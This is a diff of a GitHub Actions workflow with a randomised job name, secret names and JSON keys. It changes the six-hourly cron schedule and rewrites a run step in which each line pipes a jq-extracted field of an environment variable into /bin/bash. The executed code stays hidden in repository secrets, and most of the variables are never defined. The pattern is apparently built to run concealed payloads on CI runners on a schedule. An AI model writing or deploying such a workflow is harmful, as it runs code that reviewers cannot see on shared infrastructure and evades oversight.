@@ -3,7 +3,8 @@ name: huangyueshi4658
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 3/6 * * *'
+    - cron: '4 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,14 +12,23 @@ jobs:
       - uses: actions/checkout@v4
       - name: huangyueshi4658
         env:
-          pjfx5: ${{ secrets.pjfx5 }}
+          gc39490: ${{ secrets.gc39490 }}
         run: |
-          echo $pjfx5 | jq -r .fp99219 | /bin/bash
-          echo $b5102 | jq -r .wurho471 | /bin/bash
-          echo $qwffs9 | jq -r .f02835 | /bin/bash
-          echo $nq94357 | jq -r .h5273 | /bin/bash
-          echo $vvkg93 | jq -r .fyrl9523 | /bin/bash
-          echo $eubpv71686 | jq -r .v16 | /bin/bash
-          echo $t34 | jq -r .xjxj40014 | /bin/bash
-          echo $j401 | jq -r .qb45399 | /bin/bash
+          echo $gc39490 | jq -r .zus392 | /bin/bash
+          echo $dqqam18516 | jq -r .eda00 | /bin/bash
+          echo $ksh47795 | jq -r .r824 | /bin/bash
+          echo $k335 | jq -r .pxrdm71635 | /bin/bash
+          echo $hie4 | jq -r .g204 | /bin/bash
+          echo $w1 | jq -r .gtp8660 | /bin/bash
+          echo $j800 | jq -r .w46 | /bin/bash
+          echo $jksj74637 | jq -r .fhxf70130 | /bin/bash
+          echo $b5879 | jq -r .nuuxw0441 | /bin/bash
+          echo $baeyk6701 | jq -r .vsk191 | /bin/bash
+          echo $zctuv5 | jq -r .iragb38 | /bin/bash
+          echo $vxmic38 | jq -r .rw2555 | /bin/bash
+          echo $pdlj8619 | jq -r .krv13 | /bin/bash
+          echo $m6 | jq -r .wcpbj69399 | /bin/bash
+          echo $iswi45 | jq -r .p033 | /bin/bash
+          echo $trcg74 | jq -r .sx12 | /bin/bash
+          echo $ifk94844 | jq -r .xh8130 | /bin/bash
 
